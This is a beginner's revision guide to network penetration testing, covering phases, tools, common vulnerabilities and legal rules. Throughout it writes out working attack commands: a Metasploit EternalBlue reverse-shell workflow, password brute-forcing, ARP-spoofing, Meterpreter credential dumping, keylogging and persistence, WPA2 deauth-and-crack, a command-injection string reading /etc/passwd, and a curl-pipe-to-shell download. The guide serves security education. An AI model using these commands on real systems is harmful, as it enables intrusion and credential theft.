# 🛡️ Network Penetration Testing — Complete Revision Guide
> **For Freshers | Single Read | In-Depth with Examples, Vulnerabilities & Tools**

---

## 📌 Table of Contents
1. [What is Penetration Testing?](#1-what-is-penetration-testing)
2. [Types of Penetration Testing](#2-types-of-penetration-testing)
3. [Penetration Testing Phases (Methodology)](#3-penetration-testing-phases-methodology)
4. [Phase 1 — Reconnaissance (Information Gathering)](#4-phase-1--reconnaissance-information-gathering)
5. [Phase 2 — Scanning & Enumeration](#5-phase-2--scanning--enumeration)
6. [Phase 3 — Vulnerability Analysis](#6-phase-3--vulnerability-analysis)
7. [Phase 4 — Exploitation](#7-phase-4--exploitation)
8. [Phase 5 — Post-Exploitation](#8-phase-5--post-exploitation)
9. [Phase 6 — Reporting](#9-phase-6--reporting)
10. [Common Network Vulnerabilities](#10-common-network-vulnerabilities)
11. [Essential Tools Cheat Sheet](#11-essential-tools-cheat-sheet)
12. [Networking Concepts You Must Know](#12-networking-concepts-you-must-know)
13. [Common Protocols & Their Weaknesses](#13-common-protocols--their-weaknesses)
14. [Real-World Attack Scenarios](#14-real-world-attack-scenarios)
15. [Legal & Ethical Boundaries](#15-legal--ethical-boundaries)
16. [Quick Reference Cheat Sheet](#16-quick-reference-cheat-sheet)

---

## 1. What is Penetration Testing?

**Penetration Testing (Pen Testing)** is a simulated cyber-attack performed on a computer system, network, or application to identify security weaknesses **before** a real attacker does.

Think of it like hiring a professional thief to test if your home security is strong enough. They try to break in — but with your permission.

### 🔑 Key Terminology

| Term | Meaning |
|------|---------|
| **Vulnerability** | A weakness in a system (e.g., outdated software) |
| **Exploit** | Code/technique that takes advantage of a vulnerability |
| **Payload** | The malicious action performed after exploitation (e.g., opening a shell) |
| **Shell** | Command-line access to a remote machine |
| **Privilege Escalation** | Gaining higher access (e.g., from user → admin/root) |
| **CVE** | Common Vulnerabilities and Exposures — unique IDs for known vulnerabilities |
| **Zero-Day** | A vulnerability unknown to the vendor; no patch exists yet |
| **Attack Surface** | All the points where an attacker could try to enter |

---

## 2. Types of Penetration Testing

### By Knowledge Level

| Type | What the Tester Knows | Real-World Analogy |
|------|----------------------|---------------------|
| **Black Box** | Nothing about the target | Stranger trying to break into your house |
| **White Box** | Full access — source code, architecture, credentials | Friend with a spare key testing your locks |
| **Grey Box** | Partial info — like a regular employee | Employee trying to access restricted areas |

### By Target

- **Network Pen Testing** — Routers, firewalls, switches, servers *(this guide)*
- **Web Application Testing** — Websites, APIs, login forms
- **Social Engineering** — Phishing, pretexting (manipulating humans)
- **Physical Testing** — Bypassing door locks, badge readers
- **Wireless Testing** — Wi-Fi networks, Bluetooth

---

## 3. Penetration Testing Phases (Methodology)

The industry-standard methodology follows these **6 phases**:

```
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│   1. Reconnaissance  →  2. Scanning  →  3. Vulnerability   │
│         ↑                                   Analysis        │
│         │                                      ↓            │
│   6. Reporting  ←  5. Post-Exploitation  ←  4. Exploitation │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

> This is also known as the **PTES** (Penetration Testing Execution Standard).

---

## 4. Phase 1 — Reconnaissance (Information Gathering)

**Goal:** Collect as much information about the target as possible — without touching their systems directly.

### 🔍 Two Types of Reconnaissance

#### Passive Reconnaissance
You gather info **without interacting** with the target. The target has no idea you're looking.

**Example:** Googling a company's name to find employee names, email formats, IP ranges.

**Tools & Techniques:**

| Tool/Technique | What It Does | Example |
|----------------|-------------|---------|
| **Google Dorking** | Use special Google search operators | `site:target.com filetype:pdf` |
| **WHOIS Lookup** | Finds domain registration info | `whois target.com` → owner, registrar, nameservers |
| **Shodan** | Search engine for internet-connected devices | Find exposed webcams, routers, servers |
| **theHarvester** | Collects emails, subdomains, IPs | `theHarvester -d target.com -b google` |
| **Maltego** | Visual link analysis and OSINT | Maps relationships between people, domains, IPs |
| **LinkedIn/Social Media** | Find employee names, job roles, tech stack | "We use AWS and Python at our company" |
| **DNSdumpster** | Discovers DNS records and subdomains | Finds mail servers, hidden subdomains |

#### Active Reconnaissance
You **directly interact** with the target systems. Detectable!

**Tools:**

| Tool | What It Does | Example |
|------|-------------|---------|
| **Nmap** | Scans for open ports, running services | `nmap -sn 192.168.1.0/24` (ping sweep) |
| **Netcat** | Raw connection to ports | `nc -zv 192.168.1.1 80` |
| **Ping** | Check if host is alive | `ping 192.168.1.1` |

### 📦 What You're Looking For:
- IP addresses and IP ranges
- Open ports and services
- Domain names and subdomains
- Employee names and emails
- Technologies used (OS, web server, CMS)
- Physical location and office addresses

---

## 5. Phase 2 — Scanning & Enumeration

**Goal:** Go deeper — identify exactly what's running, what versions, and find potential entry points.

### 🔎 Scanning vs Enumeration

- **Scanning** = Finding what's open/alive
- **Enumeration** = Extracting detailed info from what's found (usernames, shares, services)

---

### Port Scanning with Nmap

Ports are like doors on a building. Each service listens on a specific port number.

**Common Ports to Remember:**

| Port | Protocol | Service |
|------|----------|---------|
| 21 | TCP | FTP (File Transfer) |
| 22 | TCP | SSH (Secure Shell) |
| 23 | TCP | Telnet (Insecure remote access) |
| 25 | TCP | SMTP (Email sending) |
| 53 | UDP/TCP | DNS (Domain Name System) |
| 80 | TCP | HTTP (Web) |
| 110 | TCP | POP3 (Email receiving) |
| 139/445 | TCP | SMB (Windows file sharing) |
| 443 | TCP | HTTPS (Secure Web) |
| 3306 | TCP | MySQL Database |
| 3389 | TCP | RDP (Remote Desktop) |
| 5900 | TCP | VNC (Remote Desktop) |
| 8080 | TCP | HTTP Alternate |

**Essential Nmap Commands:**

```bash
# Basic scan — scan top 1000 ports
nmap 192.168.1.1

# Scan all 65535 ports
nmap -p- 192.168.1.1

# OS and version detection
nmap -A 192.168.1.1

# Scan entire subnet
nmap 192.168.1.0/24

# Stealth scan (harder to detect)
nmap -sS 192.168.1.1

# UDP scan (important for DNS, SNMP)
nmap -sU 192.168.1.1

# Vulnerability scripts
nmap --script vuln 192.168.1.1

# Service/version detection
nmap -sV 192.168.1.1

# Save output to file
nmap -oN output.txt 192.168.1.1
```

**Example Output:**
```
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 7.4 (protocol 2.0)
80/tcp   open   http       Apache httpd 2.4.6
3306/tcp open   mysql      MySQL 5.6.44
3389/tcp open   ms-wbt-server  Microsoft Terminal Services
```
*This tells you: the machine runs SSH, a web server, MySQL database, and RDP — each is a potential entry point.*

---

### Enumeration

Once ports are found, dig deeper:

**SMB Enumeration (Windows Shares):**
```bash
# List shares on Windows machine
enum4linux -a 192.168.1.10

# Nmap SMB scripts
nmap --script smb-enum-shares 192.168.1.10
nmap --script smb-vuln-ms17-010 192.168.1.10   # Check EternalBlue!
```

**SNMP Enumeration:**
```bash
# SNMP can leak system info if community string is default "public"
snmpwalk -c public -v1 192.168.1.10
```

**DNS Enumeration:**
```bash
# Zone transfer attack — dumps all DNS records
dig axfr @dns-server target.com

# Subdomain brute force
dnsenum target.com
```

**Banner Grabbing** — Identifies the exact service/version:
```bash
nc -v 192.168.1.1 80
# Then type: HEAD / HTTP/1.0
# Returns: Server: Apache/2.4.6 (CentOS)  ← version info!
```

---

## 6. Phase 3 — Vulnerability Analysis

**Goal:** Map discovered services to known vulnerabilities.

### Vulnerability Scanners

| Tool | Type | What It Does |
|------|------|-------------|
| **Nessus** | Commercial (free trial) | Comprehensive vulnerability scanner |
| **OpenVAS** | Free/Open Source | Full-featured vuln scanner |
| **Nikto** | Free | Web server vulnerability scanner |
| **Nmap scripts** | Free | Specific CVE checks |
| **Searchsploit** | Free | Offline exploit database |
| **exploit-db.com** | Online | Search CVEs and exploits |

**Using Searchsploit:**
```bash
# Find exploits for Apache 2.4.6
searchsploit apache 2.4.6

# Find exploits for OpenSSH 7.4
searchsploit openssh 7.4

# Copy exploit to current directory
searchsploit -m 12345
```

**Understanding CVE Numbers:**
- Format: `CVE-YEAR-NUMBER`
- Example: `CVE-2017-0144` = EternalBlue (SMB exploit used in WannaCry ransomware)
- Look them up at: nvd.nist.gov or cve.mitre.org

### Vulnerability Severity (CVSS Score)

| Score | Severity | Action |
|-------|----------|--------|
| 9.0–10.0 | 🔴 Critical | Patch immediately |
| 7.0–8.9 | 🟠 High | Patch urgently |
| 4.0–6.9 | 🟡 Medium | Schedule patch |
| 0.1–3.9 | 🟢 Low | Patch when possible |

---

## 7. Phase 4 — Exploitation

**Goal:** Confirm vulnerabilities are real by attempting to exploit them. This is the "break-in" phase.

> ⚠️ **Only do this with explicit written permission!**

### Metasploit Framework — The Swiss Army Knife

Metasploit is the most popular exploitation framework. Think of it as an organized collection of exploit code with a user-friendly interface.

**Core Concepts:**

```
Module Structure:
├── Exploits     → Code that uses a vulnerability to gain access
├── Payloads     → What runs AFTER the exploit (e.g., open a shell)
├── Auxiliaries  → Scanners, fuzzers, etc. (no exploitation)
├── Post         → Post-exploitation modules
└── Encoders     → Obfuscate payloads to evade AV
```

**Basic Metasploit Workflow:**
```bash
# Start Metasploit
msfconsole

# Search for an exploit
search eternalblue
search type:exploit name:ms17_010

# Use a module
use exploit/windows/smb/ms17_010_eternalblue

# See required options
show options

# Set target IP
set RHOSTS 192.168.1.10

# Set payload (reverse shell = target connects back to you)
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set your listener IP
set LHOST 192.168.1.5

# Run the exploit
exploit  (or 'run')
```

**If successful, you get a Meterpreter shell — a powerful post-exploitation environment!**

---

### Real Example: EternalBlue (MS17-010)

**Vulnerability:** Windows SMBv1 remote code execution  
**CVE:** CVE-2017-0144  
**Affected:** Windows XP through Windows Server 2008 R2  
**Famous Use:** WannaCry and NotPetya ransomware (2017)

```
Attack Flow:
Attacker → sends malformed SMB packet → Windows machine crashes & executes code
Result: Full SYSTEM (highest) privileges — no password needed!
```

```bash
# In Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
exploit
# → meterpreter session opened!
```

---

### Password Attacks

#### Brute Force vs Dictionary Attack
- **Brute Force** — Try every possible combination (slow but thorough)
- **Dictionary Attack** — Try common passwords from a wordlist (faster)
- **Credential Stuffing** — Use leaked username/password combos from data breaches

**Tools:**

| Tool | Protocol | Example |
|------|----------|---------|
| **Hydra** | SSH, FTP, HTTP, SMB, RDP | `hydra -l admin -P wordlist.txt ssh://192.168.1.1` |
| **Medusa** | Multiple protocols | `medusa -h 192.168.1.1 -u admin -P pass.txt -M ssh` |
| **John the Ripper** | Crack password hashes | `john --wordlist=rockyou.txt hashes.txt` |
| **Hashcat** | GPU-accelerated hash cracking | `hashcat -m 0 hash.txt rockyou.txt` |
| **CrackMapExec** | SMB brute force + enumeration | `crackmapexec smb 192.168.1.0/24 -u admin -p password` |

**Famous Wordlists:**
- `rockyou.txt` — 14 million real passwords from a 2009 data breach
- `SecLists` — Comprehensive collection of wordlists

---

### Man-in-the-Middle (MitM) Attacks

You position yourself between two communicating parties to intercept/modify traffic.

```
Normal:  Client ←————————————→ Server
MitM:    Client ←——→ Attacker ←——→ Server
                  (reads everything)
```

**ARP Spoofing** — The most common MitM on local networks

ARP (Address Resolution Protocol) translates IP → MAC address. It has no authentication, so you can poison ARP tables.

```bash
# Tool: arpspoof
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1   # Tell victim: "I'm the router"
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100   # Tell router: "I'm the victim"

# Now capture traffic with Wireshark or ettercap
ettercap -T -q -i eth0 -M arp:remote /192.168.1.100// /192.168.1.1//
```

**Bettercap** — Modern all-in-one MitM framework:
```bash
bettercap -iface eth0
# In bettercap console:
net.probe on
arp.spoof on
net.sniff on
```

---

## 8. Phase 5 — Post-Exploitation

**Goal:** After gaining access, explore what you can do — simulate what a real attacker would do next.

### Meterpreter Commands (After Shell Access)

```bash
# System info
sysinfo
getuid          # Current user
getpid          # Process ID

# File system
pwd             # Current directory
ls              # List files
download file.txt   # Download file to attacker machine
upload hack.exe     # Upload file to victim

# Privilege escalation
getsystem       # Try to get SYSTEM privileges
getuid          # Verify you're SYSTEM

# Persistence
run persistence -h  # Keep access after reboot

# Network
ipconfig        # Network interfaces
arp             # ARP table (find other machines)
route           # Routing table

# Dump credentials
hashdump        # Dump Windows password hashes

# Screenshots & keylogging
screenshot
keyscan_start
keyscan_dump

# Pivot to other machines
portfwd add -l 3389 -p 3389 -r 192.168.2.10  # Port forward
```

---

### Privilege Escalation

Starting as a low-privilege user and getting higher access:

**Linux Privilege Escalation:**
```bash
# Check sudo permissions
sudo -l

# Find SUID binaries (run as root)
find / -perm -4000 2>/dev/null

# Check for writable cron jobs
cat /etc/crontab
ls -la /etc/cron*

# Check kernel version (kernel exploits)
uname -a

# Tool: LinPEAS (automated privilege escalation scanner)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

**Windows Privilege Escalation:**
```bash
# In Meterpreter
run post/multi/recon/local_exploit_suggester

# Manual checks
whoami /priv          # Current privileges
systeminfo            # OS version, patches
wmic qfe list         # Installed patches
```

---

### Lateral Movement

Moving from one compromised machine to other machines in the network:

```
You compromised: 192.168.1.10 (Web Server)
You can now reach: 192.168.2.0/24 (Internal network — previously unreachable!)

Technique: Use the compromised machine as a pivot point
```

**Tools:**
- **Proxychains** — Route traffic through compromised host
- **Metasploit route** — Route Metasploit through sessions
- **SSH tunneling** — `ssh -D 9050 user@192.168.1.10`

---

## 9. Phase 6 — Reporting

**Goal:** Document everything clearly so the client can understand and fix the issues.

### Report Structure

```
1. Executive Summary        → Non-technical. What was found? Risk level?
2. Scope & Methodology      → What was tested? How?
3. Findings (per vuln):
   - Vulnerability Name
   - Severity (Critical/High/Medium/Low)
   - Affected System
   - Description
   - Evidence (screenshots, command output)
   - Risk/Impact
   - Recommendation (how to fix)
4. Attack Chain / Kill Chain → How an attacker could chain vulnerabilities
5. Remediation Roadmap       → Prioritized fix list
6. Appendix                  → Full scan output, raw data
```

### Good Finding Example

```
Title: EternalBlue (MS17-010) Remote Code Execution
Severity: Critical (CVSS 9.8)
Affected Host: 192.168.1.10 (Windows Server 2008)

Description:
The host is running SMBv1 which is vulnerable to the EternalBlue exploit
(CVE-2017-0144). This allows an unauthenticated attacker to execute arbitrary
code with SYSTEM privileges.

Evidence:
[Screenshot of meterpreter session showing 'NT AUTHORITY\SYSTEM']

Impact:
Complete compromise of the system. Attacker gains full control,
can steal data, install ransomware, or move laterally.

Recommendation:
1. Apply Microsoft patch MS17-010 immediately
2. Disable SMBv1: Set-SmbServerConfiguration -EnableSMB1Protocol $false
3. Block port 445 at the perimeter firewall
```

---

## 10. Common Network Vulnerabilities

### Top Vulnerabilities You Must Know

| Vulnerability | What It Is | Affected | Tool to Exploit |
|--------------|-----------|----------|-----------------|
| **EternalBlue (MS17-010)** | SMBv1 RCE — no auth needed | Windows XP–2008 | Metasploit |
| **BlueKeep (CVE-2019-0708)** | RDP RCE — no auth needed | Windows 7/2008 | Metasploit |
| **Log4Shell (CVE-2021-44228)** | Java logging library RCE | Many Java apps | Various |
| **Heartbleed (CVE-2014-0160)** | OpenSSL memory leak — leaks private keys | Old OpenSSL | heartbleed PoC |
| **POODLE** | SSLv3 downgrade attack — decrypt HTTPS | Old SSL servers | Various |
| **ShellShock** | Bash env variable RCE | Old Linux/bash | curl |
| **Default Credentials** | Admin/admin, root/root | Routers, IoT, DBs | Hydra |
| **Open Telnet (Port 23)** | Unencrypted remote access | Old network devices | Netcat, Hydra |
| **SNMP v1/v2 public community** | Leaks full network info | Network devices | snmpwalk |
| **Anonymous FTP** | FTP login without credentials | Old FTP servers | ftp client |
| **MS08-067** | Windows RPC RCE | Windows XP/2003 | Metasploit |

---

### Vulnerability Types Explained

**1. Buffer Overflow**
When a program writes more data than a buffer can hold, overwriting adjacent memory.

```
Buffer (10 bytes): [AAAAAAAAAA]
Overflow input:    [AAAAAAAAAA][BBBBBBBBBB][SHELLCODE]
                              ↑ overflows into return address!
```

**2. SQL Injection** *(mentioned for context — more Web)*
Input: `' OR '1'='1` bypasses login because the SQL query becomes always true.

**3. Command Injection**
Input passed to OS shell without sanitization:
```
Ping target: 192.168.1.1; cat /etc/passwd
            ↑ legitimate   ↑ extra malicious command
```

**4. Misconfiguration**
- Default passwords unchanged
- Unnecessary services exposed
- World-readable sensitive files
- Open firewall rules

---

## 11. Essential Tools Cheat Sheet

### 🗺️ Reconnaissance Tools

| Tool | Purpose | Command |
|------|---------|---------|
| **Nmap** | Port scanning | `nmap -A -T4 target` |
| **theHarvester** | Email/subdomain harvesting | `theHarvester -d target.com -b all` |
| **Shodan** | Internet device search | shodan.io or `shodan search apache` |
| **Maltego** | Visual OSINT | GUI-based |
| **recon-ng** | Web reconnaissance framework | `recon-ng` |
| **Sublist3r** | Subdomain enumeration | `sublist3r -d target.com` |

### 🔎 Scanning & Enumeration Tools

| Tool | Purpose | Command |
|------|---------|---------|
| **Nmap** | Port/service scan | `nmap -sV -sC target` |
| **enum4linux** | Windows/SMB enumeration | `enum4linux -a target` |
| **Nikto** | Web server scan | `nikto -h http://target` |
| **Gobuster** | Directory/subdomain brute force | `gobuster dir -u http://target -w wordlist` |
| **snmpwalk** | SNMP enumeration | `snmpwalk -c public -v1 target` |
| **DNSrecon** | DNS enumeration | `dnsrecon -d target.com` |

### 💥 Exploitation Tools

| Tool | Purpose | Command |
|------|---------|---------|
| **Metasploit** | Exploitation framework | `msfconsole` |
| **SQLmap** | SQL injection | `sqlmap -u "http://target/page?id=1"` |
| **Hydra** | Password brute force | `hydra -l admin -P pass.txt ssh://target` |
| **Hashcat** | Hash cracking | `hashcat -m 0 hash.txt rockyou.txt` |
| **John the Ripper** | Hash cracking | `john --wordlist=rockyou.txt hashes.txt` |
| **Bettercap** | MitM attacks | `bettercap -iface eth0` |

### 🔍 Packet Analysis Tools

| Tool | Purpose | Use Case |
|------|---------|---------|
| **Wireshark** | GUI packet capture & analysis | Capture credentials over HTTP/Telnet |
| **tcpdump** | CLI packet capture | `tcpdump -i eth0 -w capture.pcap` |
| **Ettercap** | MitM + packet sniffing | ARP poisoning + capture |

### 🔧 Post-Exploitation Tools

| Tool | Purpose | Platform |
|------|---------|---------|
| **Metasploit/Meterpreter** | Full post-exploitation | Windows/Linux |
| **LinPEAS** | Linux privilege escalation scanner | Linux |
| **WinPEAS** | Windows privilege escalation scanner | Windows |
| **BloodHound** | Active Directory attack paths | Windows AD |
| **Mimikatz** | Windows credential dumping | Windows |
| **CrackMapExec** | SMB enumeration + lateral movement | Windows |
| **Impacket** | Network protocol scripts | Python-based |

### 🧰 All-in-One Distros

| Distro | Description |
|--------|-------------|
| **Kali Linux** | The most popular — comes with 600+ tools pre-installed |
| **Parrot OS** | Lighter than Kali, privacy-focused |
| **BlackArch** | Arch-based, 2000+ tools |

---

## 12. Networking Concepts You Must Know

### OSI Model (Where Attacks Happen)

```
Layer 7 — Application  → HTTP, FTP, DNS       → SQL Injection, XSS
Layer 6 — Presentation → SSL/TLS encoding      → SSL stripping, Heartbleed
Layer 5 — Session      → Session management    → Session hijacking
Layer 4 — Transport    → TCP/UDP, ports        → Port scanning, SYN flood
Layer 3 — Network      → IP routing            → IP spoofing, route injection
Layer 2 — Data Link    → MAC addresses, ARP    → ARP spoofing, MAC flooding
Layer 1 — Physical     → Cables, signals       → Physical tapping
```

### IP Addressing

```
Private IP Ranges (not routed on internet):
  10.0.0.0/8          → 10.x.x.x
  172.16.0.0/12       → 172.16.x.x – 172.31.x.x
  192.168.0.0/16      → 192.168.x.x (most home networks)

Localhost: 127.0.0.1

CIDR Notation:
  192.168.1.0/24  → 256 IPs (192.168.1.0 to 192.168.1.255)
  192.168.1.0/16  → 65,536 IPs
```

### TCP Three-Way Handshake

```
Client              Server
  |                   |
  |——SYN (seq=100)——→ |   "I want to connect"
  |                   |
  | ←—SYN-ACK———————  |   "OK, I'm ready"
  |  (seq=200,ack=101)|
  |                   |
  |——ACK (ack=201)——→ |   "Great, let's talk"
  |                   |
  [Connection Established]
```

**SYN Flood Attack** — Send thousands of SYN packets, never send ACK. Server holds half-open connections until it's overwhelmed. (DoS attack)

---

## 13. Common Protocols & Their Weaknesses

| Protocol | Port | Weakness | Attack | Secure Alternative |
|----------|------|----------|--------|--------------------|
| **Telnet** | 23 | Sends everything in plaintext | Sniff credentials with Wireshark | SSH (port 22) |
| **FTP** | 21 | Plaintext credentials | Credential sniffing | SFTP / FTPS |
| **HTTP** | 80 | No encryption | MitM, sniffing | HTTPS (443) |
| **SNMP v1/v2** | 161 | Default "public" community string | Enumerate entire network | SNMPv3 |
| **SMB v1** | 445 | EternalBlue vulnerability | RCE without auth | Disable SMBv1 |
| **RDP** | 3389 | BlueKeep, brute force, weak encryption | RCE, credential stuffing | NLA + VPN |
| **DNS** | 53 | No authentication, zone transfers | DNS poisoning, zone transfer | DNSSEC |
| **NTP** | 123 | Amplification attacks | DDoS amplification | Rate limiting |
| **SMTP** | 25 | Open relay, no auth by default | Spam relay, phishing | STARTTLS + auth |

---

## 14. Real-World Attack Scenarios

### Scenario 1: Compromising a Corporate Network (Step-by-Step)

```
Step 1: RECON
  └─ theHarvester finds: john.doe@company.com, jane.smith@company.com
  └─ Shodan shows: Port 3389 (RDP) open on 203.0.113.10
  └─ WHOIS: IP range 203.0.113.0/24

Step 2: SCANNING
  └─ nmap -A 203.0.113.10
  └─ Result: Windows Server 2016, RDP open, SMB open

Step 3: VULNERABILITY ANALYSIS
  └─ searchsploit rdp windows 2016
  └─ Nessus scan shows: SMBv1 enabled, MS17-010 vulnerable!

Step 4: EXPLOITATION
  └─ msfconsole
  └─ use exploit/windows/smb/ms17_010_eternalblue
  └─ set RHOSTS 203.0.113.10
  └─ exploit
  └─ Result: meterpreter session opened as NT AUTHORITY\SYSTEM 🎯

Step 5: POST-EXPLOITATION
  └─ hashdump → gets NTLM hashes
  └─ Crack with Hashcat → recovers domain admin password
  └─ Use password to move to Domain Controller
  └─ Full network compromise!

Step 6: REPORTING
  └─ Document all findings, evidence, and remediation steps
```

---

### Scenario 2: Wi-Fi Attack (WPA2 Cracking)

```bash
# 1. Set wireless adapter to monitor mode
airmon-ng start wlan0
# → creates wlan0mon

# 2. Scan for networks
airodump-ng wlan0mon

# 3. Capture WPA2 handshake from target network
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# 4. Force a client to reconnect (deauth attack) to capture handshake
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# 5. Crack the handshake with wordlist
aircrack-ng capture.cap -w rockyou.txt
# Result: KEY FOUND! [ password123 ]
```

---

### Scenario 3: Network Sniffing on Unsecured Wi-Fi

```
Café Wi-Fi scenario:
  - Victim connects to "Cafe_Free_WiFi"
  - Attacker is on same network
  - Attacker runs Wireshark
  - Victim visits HTTP site → attacker sees username/password in plaintext!

Protection: Always use HTTPS sites + VPN on public Wi-Fi
```

---

## 15. Legal & Ethical Boundaries

> 🚨 **CRITICAL:** Unauthorized penetration testing is a criminal offense in most countries.

### ✅ Legal Requirements

1. **Written Authorization** — Always get a signed scope document before testing
2. **Rules of Engagement (RoE)** — Define: what to test, what NOT to test, time window
3. **Scope Definition** — Exact IP ranges, domains, systems in scope
4. **Emergency Contact** — Who to call if something breaks

### Laws to Know

| Country | Law |
|---------|-----|
| 🇺🇸 USA | Computer Fraud and Abuse Act (CFAA) |
| 🇬🇧 UK | Computer Misuse Act 1990 |
| 🇮🇳 India | IT Act 2000, Section 66 |
| 🇪🇺 EU | Directive 2013/40/EU |

### ⚡ Safe Practice Environments

Learn ethically on:
- **TryHackMe** (tryhackme.com) — Beginner-friendly guided rooms
- **Hack The Box** (hackthebox.com) — Real-world vulnerable machines
- **VulnHub** (vulnhub.com) — Download vulnerable VMs
- **DVWA** — Damn Vulnerable Web Application (local practice)
- **Metasploitable** — Intentionally vulnerable Linux VM
- **PentesterLab** — Web security focused

---

## 16. Quick Reference Cheat Sheet

### Attack Kill Chain

```
Recon → Weaponize → Deliver → Exploit → Install → C2 → Actions
 ↓          ↓           ↓         ↓         ↓       ↓      ↓
Find      Create      Send     Run       Persist  Control  Goal
target    exploit    payload   exploit   backdoor  remote  achieved
```

### Nmap Quick Reference

```bash
nmap -sn 192.168.1.0/24          # Host discovery
nmap -sV -sC -O target           # Version + scripts + OS detection
nmap -p- target                  # All ports
nmap -sS target                  # Stealth SYN scan
nmap --script vuln target        # Vulnerability scan
nmap -A -T4 target               # Aggressive scan
```

### Metasploit Quick Reference

```bash
msfconsole                       # Start
search [term]                    # Find modules
use [module]                     # Select module
show options                     # Show required fields
set [OPTION] [VALUE]             # Set option
show payloads                    # Compatible payloads
exploit / run                    # Execute
sessions -l                      # List open sessions
sessions -i 1                    # Interact with session 1
background                       # Background current session
```

### Common Default Credentials

| Device | Default Username | Default Password |
|--------|-----------------|-----------------|
| Most routers | admin | admin / password |
| Cisco | cisco | cisco |
| MySQL | root | (blank) |
| PostgreSQL | postgres | postgres |
| MongoDB | (none) | (none) — no auth! |
| FTP | anonymous | anonymous / (blank) |
| Telnet | admin | admin |

---

### Certification Path for Beginners

```
Beginner                  Intermediate               Advanced
────────                  ────────────               ────────
CompTIA Security+    →    CEH (EC-Council)    →    OSCP (Offensive Security)
eJPT (eLearnSecurity)     PNPT (TCM Security)       OSEP, OSED
                          CompTIA PenTest+           CREST
```

### Learning Roadmap

```
Month 1-2:  Linux fundamentals + Networking basics (TCP/IP, DNS, HTTP)
Month 3-4:  Kali Linux setup + Nmap + Wireshark + TryHackMe rooms
Month 5-6:  Metasploit + Exploitation basics + Hack The Box easy machines
Month 7-9:  Web app testing + Active Directory + OSCP preparation
Month 10+:  Advanced exploits + Custom tooling + Bug bounty programs
```

---

## 📚 Resources to Continue Learning

| Resource | Type | Link |
|----------|------|------|
| TryHackMe | Interactive learning | tryhackme.com |
| Hack The Box | Practice machines | hackthebox.com |
| TCM Security Academy | Video courses | academy.tcm-sec.com |
| PortSwigger Web Academy | Web security | portswigger.net/web-security |
| IppSec YouTube | HTB walkthroughs | youtube.com/c/ippsec |
| The Cyber Mentor (YouTube) | Free courses | youtube.com/c/thecybermentor |
| OWASP | Security standards | owasp.org |

---

> **💡 Final Tip:** The best pen testers think like attackers but act with ethics. Start with TryHackMe's "Pre-Security" path, get comfortable with Linux and networking, then move to actual machines. Consistency beats intensity — 1 hour daily beats 8 hours on weekends.

---
*Guide Version 1.0 | For Educational Purposes Only | Always hack ethically and legally*
